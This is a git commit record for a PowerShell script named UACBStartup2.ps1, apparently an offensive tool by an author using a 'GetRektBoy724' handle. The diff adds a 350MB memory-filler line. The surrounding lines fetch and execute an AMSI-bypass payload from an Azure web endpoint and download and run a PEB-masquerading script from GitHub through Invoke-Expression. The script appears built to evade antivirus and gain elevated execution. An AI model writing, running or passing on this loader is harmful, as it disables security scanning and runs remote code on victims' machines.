1d6de744234ae32350eac2bc583ed48485ad9654
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-03-10 12:03:11 +0700

    Update UACBStartup2.ps1

--- UACBStartup2.ps1
+++ UACBStartup2.ps1
@@ -1,3 +1,4 @@
+$fillmybuffer = "a" * 350MB
 $accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing
 Invoke-Expression $accessAMBY.Content
 Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
